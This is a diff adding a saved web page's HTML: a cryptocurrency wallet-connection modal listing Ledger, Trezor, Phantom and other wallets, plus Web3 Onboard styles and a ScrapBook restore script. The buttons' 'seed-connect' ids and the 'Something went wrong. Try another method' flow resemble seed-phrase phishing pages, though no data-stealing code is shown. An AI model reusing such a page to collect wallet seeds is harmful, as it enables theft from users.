+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="ledger-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="ae04346af3e236a8afa61cb9ba0c83cb20529ebc.webp" alt="Ledger">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Ledger</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="trezor-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="8d2be3d92fd1fa674c62a8369a3f905fdf5d1994.svg" alt="Trezor Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Trezor Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="phantom-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="a47f58b2b524b35acd3eb55b2b825c92d5a957d3.webp" alt="Phantom Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Phantom Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="okx-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="1120733df2e8f9bfde2f713c1de00711d356d4ef.webp" alt="OKX Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">OKX Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="rabby-wallet-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="0be5d8a672ca3552faeab698db403e9090b847b3.webp" alt="Rabby Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Rabby Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="uniswap-wallet-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="07e1119604e23a43c48944d63195c32b9abea690.webp" alt="Uniswap Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Uniswap Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="solflare-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="1b24c9da110c92066eb57685034f1dfd41c6927d.svg" alt="Solflare">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Solflare</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="magiceden-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="b3c5d367091971f064a3c05eccb74f1122da2c1c" alt="Magic Eden">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Magic Eden</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+                    </div>
+                </div>
+                <div class="md:scwtw-basis-1/2 md:scwtw-h-full">
+                    <div class="scwtw-w-full md:scwtw-h-full scwtw-h-[150px] md:scwtw-p-0 scwtw-p-4 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-rounded-[24px] scwtw-bg-[#f0f0f0] dark:scwtw-bg-[#ffffff05] scwtw-animate-pulse">
+                        <div class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-opacity-100" id="initial-text-start-modal">
+                            <div>
+                                <svg class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg>
+                            </div>
+                            <div class="scwtw-max-w-[250px] scwtw-text-center">
+                                <p class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]">Connect your wallet to get started</p>
+                            </div>
+                        </div>
+                        <div class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-hidden scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400" id="open-text-start-modal">
+                            <div>
+                                <svg class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M14 4.1 12 6"></path><path d="m5.1 8-2.9-.8"></path><path d="m6 12-1.9 2"></path><path d="M7.2 2.2 8 5.1"></path><path d="M9.037 9.69a.498.498 0 0 1 .653-.653l11 4.5a.5.5 0 0 1-.074.949l-4.349 1.041a1 1 0 0 0-.74.739l-1.04 4.35a.5.5 0 0 1-.95.074z"></path></svg>
+                            </div>
+                            <div class="scwtw-max-w-[250px] scwtw-text-center">
+                                <p class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]">Confirm the wallet connection</p>
+                            </div>
+                        </div>
+                        <div class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-hidden scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400" id="import-text-start-modal">
+                            <div>
+                                <svg class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8L18.74 5.74A9.75 9.75 0 0 0 12 3C11 3 10.03 3.16 9.13 3.47"></path><path d="M8 16H3v5"></path><path d="M3 12C3 9.51 4 7.26 5.64 5.64"></path><path d="m3 16 2.26 2.26A9.75 9.75 0 0 0 12 21c2.49 0 4.74-1 6.36-2.64"></path><path d="M21 12c0 1-.16 1.97-.47 2.87"></path><path d="M21 3v5h-5"></path><path d="M22 22 2 2"></path></svg>
+                            </div>
+                            <div class="scwtw-max-w-[250px] scwtw-text-center">
+                                <p class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]">Something went wrong. Try another method</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div></div><div id="start-modal-overlay" class="scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#0000004d] dark:scwtw-bg-[#00000080] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-z-[2147483645] scwtw-opacity-0" style="display: none;"></div><onboard-v2 style="all: initial;" data-scrapbook-shadowdom="
+
+  <style>
+    :host {
+          /* COLORS */
+          --white: white;
+          --black: black;
+          --primary-1: #2F80ED;
+          --primary-100: #eff1fc;
+          --primary-200: #d0d4f7;
+          --primary-300: #b1b8f2;
+          --primary-400: #929bed;
+          --primary-500: #6370e5;
+          --primary-600: #454ea0;
+          --primary-700: #323873;
+          --gray-100: #ebebed;
+          --gray-200: #c2c4c9;
+          --gray-300: #999ca5;
+          --gray-400: #707481;
+          --gray-500: #33394b;
+          --gray-600: #242835;
+          --gray-700: #1a1d26;
+          --success-100: #d1fae3;
+          --success-200: #baf7d5;
+          --success-300: #a4f4c6;
+          --success-400: #8df2b8;
+          --success-500: #5aec99;
+          --success-600: #18ce66;
+          --success-700: #129b4d;
+          --danger-100: #ffe5e6;
+          --danger-200: #ffcccc;
+          --danger-300: #ffb3b3;
+          --danger-400: #ff8080;
+          --danger-500: #ff4f4f;
+          --danger-600: #cc0000;
+          --danger-700: #660000;
+          --warning-100: #ffefcc;
+          --warning-200: #ffe7b3;
+          --warning-300: #ffd780;
+          --warning-400: #ffc74c;
+          --warning-500: #ffaf00;
+          --warning-600: #cc8c00;
+          --warning-700: #664600;
+
+          /* FONTS */
+          --font-family-normal: var(--w3o-font-family, Inter, sans-serif);
+
+          --font-size-1: 3rem;
+          --font-size-2: 2.25rem;
+          --font-size-3: 1.5rem;
+          --font-size-4: 1.25rem;
+          --font-size-5: 1rem;
+          --font-size-6: .875rem;
+          --font-size-7: .75rem;
+
+          --font-line-height-1: 24px;
+          --font-line-height-2: 20px;
+          --font-line-height-3: 16px;
+          --font-line-height-4: 12px;
+
+          /* SPACING */
+          --spacing-1: 3rem;
+          --spacing-2: 2rem;
+          --spacing-3: 1.5rem;
+          --spacing-4: 1rem;
+          --spacing-5: 0.5rem;
+          --spacing-6: 0.25rem;
+          --spacing-7: 0.125rem;
+
+          /* BORDER RADIUS */
+          --border-radius-1: 24px;
+          --border-radius-2: 20px;
+          --border-radius-3: 16px;
+          --border-radius-4: 12px;
+          --border-radius-5: 8px;
+
+          /* SHADOWS */
+          --shadow-0: none;
+          --shadow-1: 0px 4px 12px rgba(0, 0, 0, 0.1);
+          --shadow-2: inset 0px -1px 0px rgba(0, 0, 0, 0.1);
+          --shadow-3: 0px 4px 16px rgba(0, 0, 0, 0.2);
+
+          /* MODAL POSITIONING */
+          --modal-z-index: 10;
+          --modal-top: unset;
+          --modal-right: unset;
+          --modal-bottom: unset;
+          --modal-left: unset;
+
+          /* MODAL STYLES */
+          --modal-backdrop: rgba(0, 0, 0, 0.6);
+
+        }
+      </style>
+    <style id=&quot;svelte-w5zexe&quot;>.flex{display:flex}.inline-flex{display:inline-flex}.flex-column{flex-direction:column}.items-center{align-items:center}.items-end{align-items:flex-end}.items-start{align-items:flex-start}.justify-center{justify-content:center}.justify-start{justify-content:flex-start}.justify-between{justify-content:space-between}.justify-end{justify-content:flex-end}.justify-around{justify-content:space-around}.relative{position:relative}.absolute{position:absolute}.fixed{position:fixed}.pointer{cursor:pointer}.shadow-1{box-shadow:var(--onboard-shadow-1, var(--shadow-1))}.w-100{width:100%}*{box-sizing:border-box}input{background:var(--onboard-white, var(--white))}input{width:100%;padding:0.5rem 1rem;outline:2px solid var(--onboard-gray-200, var(--gray-200));border:none;border-radius:8px;font-size:1rem;line-height:1.5;color:var(--onboard-gray-600, var(--gray-600));transition:all 200ms ease-in-out}input[type='checkbox']{-webkit-appearance:none;appearance:none;width:auto;background:var(--onboard-white, var(--white));outline:1px solid var(--onboard-gray-300, var(--gray-300));border:none;padding:0.5em;border-radius:3px;display:flex;justify-content:center;align-items:center;position:relative;cursor:pointer}input[type='checkbox']:hover{border-color:var(
+      --onboard-checkbox-background,
+      var(--onboard-primary-500, var(--primary-500))
+    )}input[type='checkbox']:checked{background:var(
+      --onboard-checkbox-background,
+      var(--onboard-primary-500, var(--primary-500))
+    );border-color:var(
+      --onboard-checkbox-background,
+      var(--onboard-primary-500, var(--primary-500))
+    );color:var(--onboard-checkbox-color, var(--onboard-white, var(--white)))}input[type='checkbox']:checked:after{content:url(&quot;e4e65d7b8fd2273343db2fa77a3642e8ed919a86.svg&quot;);font-size:12px;position:absolute;color:var(--onboard-checkbox-color, var(--onboard-white, var(--white)))}input:hover{border-color:var(
+      --onboard-checkbox-color,
+      var(--onboard-white, var(--white))
+    )}input:focus{border-color:var(--onboard-primary-500, var(--primary-500));box-shadow:0 0 1px 1px
+      var(
+        --onboard-checkbox-background,
+        var(--onboard-primary-500, var(--primary-500))
+      );box-shadow:0 0 0 1px -moz-mac-focusring}input:disabled, textarea:disabled, select:disabled{background:var(--gray-100)}input::-moz-focus-inner{outline:0;padding:0;margin-top:-2px;margin-bottom:-2px}a{color:var(
+      --onboard-link-color,
+      var(--onboard-primary-500, var(--primary-500))
+    );text-decoration:none}a:hover{text-decoration:underline}button{display:flex;align-items:center;justify-content:center;padding:calc(var(--onboard-spacing-4, var(--spacing-4)) - 1px);border-radius:24px;cursor:pointer;font:inherit;border:none;transition:background-color 150ms ease-in-out, color 150ms ease-in-out}.onboard-button-primary{background:var(--onboard-white, var(--white));padding:calc(var(--onboard-spacing-5, var(--spacing-5)) - 1px)
+      calc(var(--onboard-spacing-4, var(--spacing-4)) - 1px);color:var(--onboard-gray-500, var(--gray-500));font-size:var(--onboard-font-size-6, var(--font-size-6));line-height:var(--onboard-font-line-height-3, var(--font-line-height-3));border:1px solid var(--onboard-gray-500, var(--gray-500));font-weight:600}.button-neutral-solid{width:100%;border-radius:8px;background:var(--onboard-gray-500, var(--gray-500));color:var(--onboard-white, var(--white));line-height:var(--onboard-font-line-height-3, var(--font-line-height-3))}.button-neutral-solid-b{width:100%;background:var(--onboard-gray-100, var(--gray-100));color:var(--onboard-gray-500, var(--gray-500));line-height:var(--onboard-font-line-height-3, var(--font-line-height-3))}button.rounded{border-radius:24px}.button-neutral-solid:hover{background:var(--onboard-gray-700, var(--gray-700))}.button-neutral-solid-b:hover{background:var(--onboard-gray-200, var(--gray-200))}.button-neutral-solid:active{color:var(--onboard-gray-300, var(--gray-300))}.button-neutral-solid-b:active{color:var(--onboard-gray-600, var(--gray-600));background:var(--onboard-gray-300, var(--gray-300))}.container.svelte-w5zexe{padding:16px;font-family:var(--onboard-font-family-normal, var(--font-family-normal));pointer-events:none;touch-action:none;width:100%}.z-indexed.svelte-w5zexe{z-index:var(--account-center-z-index)}@media all and (min-width: 428px){.container.svelte-w5zexe{max-width:348px}}</style>      <div class=&quot;container flex flex-column fixed z-indexed svelte-w5zexe&quot; style=&quot;
+        top: var(--notify-onboard-container-position-top, 0); 
+        right: var(--notify-onboard-container-position-right, 0);; &quot;><div id=&quot;w3o-transaction-preview-container&quot;></div>  </div><style id=&quot;svelte-1h8mmo3&quot;>ul.svelte-1h8mmo3{padding-left:0;display:flex;flex-flow:column nowrap;font-size:var(
+      --notify-onboard-font-size,
+      var(--onboard-font-size-5, var(--font-size-5))
+    );list-style-type:none;overflow:visible;scrollbar-width:none;box-sizing:border-box;z-index:var(--notify-onboard-z-index, 300);font-family:var(
+      --notify-onboard-font-family,
+      var(--onboard-font-family-normal, inherit)
+    );margin:8px 0;pointer-events:all}.y-scroll.svelte-1h8mmo3{overflow-y:scroll}.y-visible.svelte-1h8mmo3{overflow-y:visible}li.notification-list-top.svelte-1h8mmo3:not(:first-child){margin-top:8px}li.notification-list-bottom.svelte-1h8mmo3:not(:first-child){margin-bottom:8px}ul.bn-notify-bottomLeft.svelte-1h8mmo3,ul.bn-notify-bottomRight.svelte-1h8mmo3{flex-direction:column-reverse}@media only screen and (max-width: 450px){ul.svelte-1h8mmo3{width:100%}}.bn-notify-clickable:hover{cursor:pointer}.svelte-1h8mmo3::-webkit-scrollbar{display:none}</style>"></onboard-v2><style>
+    
+@font-face {
+  font-family: 'Inter';
+  font-style:  normal;
+  font-weight: 300 600;
+  font-display: swap;
+  src: url("InterVariable.woff2") format("woff2-variations");
+}
+
+  </style><script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({mode: 'open'}); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script></body></html>
